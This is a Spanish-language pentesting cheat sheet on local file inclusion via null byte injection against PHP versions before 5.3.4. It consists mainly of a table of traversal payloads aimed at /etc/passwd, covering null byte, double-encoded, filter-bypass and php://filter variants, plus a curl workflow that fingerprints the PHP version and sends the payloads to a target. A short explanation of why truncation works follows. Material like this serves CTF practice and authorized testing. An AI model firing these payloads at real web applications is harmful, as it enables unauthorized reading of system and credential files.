---
aliases:
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI - Null Byte Injection

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `../../../../etc/passwd%00` | Trunca todo lo que el server append después | App hace `include($_GET['p'] . '.php')` — PHP <5.3.4. |
| `../../../../etc/passwd%00.php` | Mismo efecto, `.php` ignorado por null terminator | Mismo target legacy. |
| `../../../../etc/passwd%2500` | Doble URL encoding del null | Server decode una vez antes de validar. |
| `../../../../etc/passwd%25%30%30` | Double encoding char-by-char | WAF decode una vez. |
| `....//....//etc/passwd%00` | Combo null byte + bypass `../` filter | Filtro hace `str_replace('../', '')`. |
| `php://filter/resource=../../../../etc/passwd%00` | Null byte + wrapper PHP | Wrapper + null byte combo. |
| `../../../../etc/passwd\x00` (via Burp byte editor) | Null byte literal (no URL-encoded) | Backend procesa byte 0x00 directo. |
^lfi-nullbyte

### Workflow + verificación de versión

```bash
# 1. Identificar versión PHP — null byte solo funciona PHP <5.3.4
curl -sI https://target | grep -i 'x-powered-by'
# Si X-Powered-By: PHP/5.2.x → null byte viable

# 2. Probar contra source append
TARGET="https://target/?page=PAYLOAD"
curl -s "${TARGET//PAYLOAD/..%2F..%2F..%2F..%2Fetc%2Fpasswd%00}"

# 3. Si %00 no funciona, doble URL encoding
curl -s "${TARGET//PAYLOAD/..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500}"
```

### Cuándo NO funciona

- **PHP ≥5.3.4** — `magic_quotes_gpc` + null byte check incorporado.
- **Java/Node/.NET** — null byte no terminator nativo, no truncación.
- **Apps con whitelist de extensiones** (Sin append) — no hay nada que truncar.

---

## Overview

Null byte (`%00`, `\x00`) = terminator C-string. PHP <5.3.4 pasaba strings a funciones C que paraban en byte 0 → todo lo append después del `%00` era ignorado.

Caso clásico: `include($_GET['p'] . '.php')`:
- Con `?p=../etc/passwd` → `include('../etc/passwd.php')` → no existe.
- Con `?p=../etc/passwd%00` → C-side string = `../etc/passwd` → lee el archivo.

Técnica **legacy**. Probable en CTFs, sistemas no actualizados, embedded devices. En stacks modernos pivotar a [[LFI - PHP Wrappers]] (`php://filter`) que tampoco depende de la extensión.

---
